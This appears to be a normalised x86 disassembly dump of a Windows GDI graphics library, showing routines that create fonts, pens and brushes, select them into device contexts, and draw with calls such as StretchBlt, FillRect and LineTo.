mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404100
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407d30
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41f7ec
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41f6b0
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41f26c
mov edx esp
mov eax ebx
call sub_41f4a4
add esp 0x2c
pop esi
pop ebx
retn
sub_41f6dc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41f48c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41f4a4
add esp 0x2c
pop esi
pop ebx
retn
sub_41f71c
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41f48c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b78
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404138
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a68
mov edx esp
mov eax ebx
call sub_41f4a4
sub_41f794
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41f6dc
pop esi
pop ebx
retn
sub_41f7c0
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41f48c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41f4a4
add esp 0x30
pop ebx
retn
sub_41f7f4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41f48c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41f4a4
add esp 0x2c
pop esi
pop ebx
retn
sub_41f824
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41f48c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41f4a4
add esp 0x2c
pop esi
pop ebx
retn
sub_41f84c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41e864
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41f890
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41e948
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41f8b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4170bc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41f078
xor eax eax
push ebp
push sub_41f957
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41f078
xor eax eax
push ebp
push sub_41f93a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ea70
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41faa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f941
mov eax [ ebp - 0x8 ]
call sub_41f088
retn
sub_41f970
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41f988
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41f078
xor eax eax
push ebp
push sub_41f9cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41e9f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9d4
mov eax [ ebp - 0x4 ]
call sub_41f088
retn
sub_41f9e0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41f970
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41f988
add esp 0x10
pop esi
pop ebx
retn
sub_41fa08
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41e84c
xor eax eax
push ebp
push sub_41fa8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41e858
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41f034
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41fabc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41f970
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41f988
add esp 0x10
pop esi
pop ebx
retn
sub_41faec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41f970
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41f988
sub_41fb18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41e864
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41fb58
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41e948
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41fb80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4170bc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41f078
xor eax eax
push ebp
push sub_41fc10
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41f078
xor eax eax
push ebp
push sub_41fbf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ea70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbfa
mov eax [ ebp - 0x8 ]
call sub_41f088
retn
sub_41fc28
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41fc44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41f078
xor eax eax
push ebp
push sub_41fc89
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41e9f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc90
mov eax [ ebp - 0x4 ]
call sub_41f088
retn
sub_41fc94
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41fc44
add esp 0x10
pop edi
pop esi
retn
sub_41fcc0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41fc28
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41fc44
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41fcf4
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41e84c
xor edx edx
push ebp
push sub_41fdc1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41e858
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41f034
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41fddc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41fc28
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41fc44
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41fe10
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f320
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_420608
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f84c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_420628
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb18
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_420648
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_416dfc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41fed4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_416e98
xor edx edx
mov eax esi
call sub_420440
mov eax [ esi + 0xc ]
call sub_403164
mov eax [ esi + 0x10 ]
call sub_403164
mov eax [ esi + 0x14 ]
call sub_403164
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417090
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_41ff30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_420494
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41ffb8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
mov eax [ ebx + 0x14 ]
call sub_41fcb8
call sub_41f034
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41f034
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4156e4
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_420064
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
mov eax [ ebx + 0x14 ]
call sub_41fcf4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4200a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
mov eax [ ebx + 0x14 ]
call sub_41fcf4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4200dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_42013c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_420168
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4201a0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4201dc
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40415c
push eax
mov eax edi
call sub_40435c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_420220
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4201dc
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42023c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4201dc
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42025c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4202a8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202af
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_420114
sub_420308
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_42032c
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_42013c
pop ecx
pop edx
pop edi
pop esi
retn
sub_42034c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_420378
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_420494
mov eax [ ebp + 0x8 ]
call sub_41f034
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4203e0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_420440
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_4203e0
mov edx esp
mov eax ebx
call sub_420308
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_42032c
sub_420494
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_420530
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
test bl 0x8
je r-xdata
mov eax esi
call sub_42055c
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_42058c
sub_420530
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_41f508
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41f034
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_42055c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41fa08
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_42058c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_41fcf4
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_41fcf4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_41fdd4
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_41fcb8
call sub_41f034
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41fcb8
call sub_41f034
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_4206b0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4206fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420701
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_420704
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_4207a0
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_4206b0
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_40410c
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4207a7
lea eax [ ebp - 0x104 ]
call sub_403e9c
retn
sub_4207bc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_42090a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_420879
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_420704
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_420704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420911
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_42091c
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_420950
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
